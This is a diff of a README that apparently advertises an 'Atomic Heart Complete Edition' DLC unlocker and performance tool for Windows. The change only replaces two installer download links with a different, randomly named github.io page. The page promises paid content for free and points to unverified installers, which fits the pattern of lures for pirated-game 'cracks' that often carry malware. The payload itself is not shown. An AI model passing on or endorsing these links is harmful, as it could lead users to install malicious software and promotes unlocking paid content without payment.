@@ -2,7 +2,7 @@
 
 Atomic Heart Complete Edition is a powerful tool designed to unlock all downloadable content and optimize gameplay for Windows 10 and 11 users. This suite ensures you get the most out of Atomic Heart Complete Edition with enhanced performance and full access to all features in 2026, providing a seamless and enriched gaming journey.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -63,7 +63,7 @@ Ensure that you have launched Atomic Heart Complete Edition at least once after 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
